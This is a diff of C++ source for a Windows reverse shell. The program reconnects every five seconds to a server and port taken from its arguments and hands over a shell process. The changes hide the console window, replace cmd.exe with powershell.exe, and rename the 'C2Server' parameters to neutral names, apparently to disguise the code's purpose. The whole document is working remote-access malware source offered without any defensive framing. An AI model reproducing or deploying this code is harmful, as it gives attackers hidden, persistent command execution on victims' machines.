@@ -4,8 +4,13 @@
 #pragma comment(lib, "Ws2_32.lib")
 #define DEFAULT_BUFLEN 1024
 
+void HideConsole()
+{
+    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+}
 
-void RunShell(char* C2Server, int C2Port) {
+
+void RunShell(char* RemoteServer, int Port) {
     while (true) {
         Sleep(5000);    // Five Second
 
@@ -16,8 +21,8 @@ void RunShell(char* C2Server, int C2Port) {
         mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
         addr.sin_family = AF_INET;
 
-        addr.sin_addr.s_addr = inet_addr(C2Server);
-        addr.sin_port = htons(C2Port);
+        addr.sin_addr.s_addr = inet_addr(RemoteServer);
+        addr.sin_port = htons(Port);
 
         if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
             closesocket(mySocket);
@@ -34,7 +39,7 @@ void RunShell(char* C2Server, int C2Port) {
                 continue;
             }
             else {
-                char Process[] = "cmd.exe";
+                char Process[] = "powershell.exe";
                 STARTUPINFO sinfo;
                 PROCESS_INFORMATION pinfo;
                 memset(&sinfo, 0, sizeof(sinfo));
@@ -62,7 +67,7 @@ void RunShell(char* C2Server, int C2Port) {
 }
 
 int main(int argc, char** argv) {
-    FreeConsole();
+    HideConsole();
     if (argc == 3) {
         int port = atoi(argv[2]);
         RunShell(argv[1], port);
